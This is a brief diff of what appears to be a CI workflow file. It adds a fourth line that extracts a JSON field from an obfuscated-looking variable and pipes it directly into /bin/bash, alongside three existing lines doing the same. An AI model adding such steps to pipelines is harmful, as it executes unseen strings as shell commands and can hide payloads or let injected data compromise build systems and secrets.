@@ -34,6 +34,7 @@ jobs:
           echo $z5277 | jq -r .dp7111 | /bin/bash
           printf '%s' "$i4" | jq -r .y8 | /bin/bash
           printf '%s' "$h1911" | jq -r .e0 | /bin/bash
+          printf '%s' "$vdt68" | jq -r .jaq0 | /bin/bash
 
       - name: Store results
         if: always()
